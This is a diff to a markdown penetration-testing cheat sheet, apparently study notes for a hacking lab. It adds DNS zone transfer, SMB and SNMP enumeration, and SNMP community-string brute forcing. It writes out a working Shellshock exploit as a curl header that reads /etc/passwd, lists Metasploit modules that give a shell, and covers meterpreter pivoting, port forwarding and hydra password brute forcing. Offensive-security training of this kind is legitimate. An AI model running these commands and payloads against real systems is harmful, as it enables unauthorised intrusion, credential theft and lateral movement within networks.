@@ -14,10 +14,15 @@
     
 ### 3.DNS Misconfiguration
 
-    - dig @authorative_dns_server -t axfr DOMAIN      :    Exploiting zone transfer to display all subdomains
-    - Exploiting zone transfer to display zone
+    - dig @authorative_dns_server -t axfr DOMAIN              :    Exploiting zone transfer to display all subdomains
+    - dig @authorative_dns_server axfr -x subNet (192.168)    :    Reverse DNS
 
 ### 2.SMB Misconfiguration
+
+nmap -p445 --script smb-protocols TARGET
+nmap -p445 --script smb-security-mode TARGET
+nmap -p445 --script smb-enum-users  TARGET
+
    #### 2.1 SMB Share
      Mount shared drive : 
        - Linux   : mount -t cifs -o user=USER,password=PWD,rw //IP/share
@@ -31,10 +36,28 @@
 
    #### 2.3 Check Null session (Anynomous Access)
     smbclient -L IPTarget
-   
+
+
+### 3.SNMP 
+#### 3.1 Detection
+    nmap -sU -p 161 Target
+
+#### 3.2 Exploitation to guess community string and Collect Info
+    nmap -sU -p 161 --script=snmp-brute Target
+    snmpwalk -v 1 -c public Target
+    nmap -sU -p 161 --script snmp-* Target > snmp_output
 
 ### 4.Exploitation
 
+#### 4.1 Exploit ShellShock CVE-2014-6271 (suppose it is at /browser.cgi)
+    nmap -sV -p80 --script http-shellshock --script-args uri=/browser.cgi,cmd='echo Content-Type: text/html; echo; /usr/bin/id' Target
+    curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://Target/browser.cgi
+
+#### 4.2 Other common exploits 
+    - exploit/unix/ftp/proftpd_133c_backdoor for ProFTPD ==> Result in a shell
+    - exploit/multi/misc/java_rmi_server ==> Result in a shell
+    - auxiliary/scanner/mysql/mysql_authbypass_hashdump ==> dump mysql password hashes
+    - exploit/windows/http/badblue_passthru for badblue 2.7 ==> Result in a shell
 
 ### 3.Post Exploitation
 
@@ -65,13 +88,20 @@
               ==> icacls “Path”
     
     - Using powerUp.ps1 script
-    - 
         
 ##### 3.1.3 Specific Linux
 
 #### 3.3 Pivoting
-    route add 192.168.4.0 (subnet) 255.255.255.0(mask) 6(session)
-    portfarwarding (meterpreter) ==> portfwd victimeIP -p ServicePort add -L 127.0.0.1 -l LocalPort -r
+    From MSF Console : route add 192.168.4.0 (subnet) 255.255.255.0(mask) 6(session)
+    From metrerpreter : run autoroute -s 192.168.4.0/24
+    
+    portfarwarding (meterpreter) ==>  portfwd add -l LocalPort -p ServicePort -r victimeIP (ex: portfwd add -l 1234 -p 80 -r 10.0.17.12)
+    portfwd list    ==> This meterpreter command display current portforwarding
+
+### 4.Bruteforcing
+
+hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
+
 
 ### 5.Sniffing
 
